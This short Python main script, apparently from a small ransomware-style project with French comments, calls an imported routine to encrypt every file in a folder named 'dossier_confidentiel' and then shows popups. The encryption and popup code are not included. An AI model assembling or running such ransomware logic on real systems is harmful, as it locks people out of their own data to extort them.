from encrypt import encrypt_main as encrypt
from send_popup import show_popup

def main():
    encrypt() #Chiffrement de tous les fichiers dans dossier_confidentiel
    show_popup() #Envoie des popups

if __name__ == "__main__":
    main()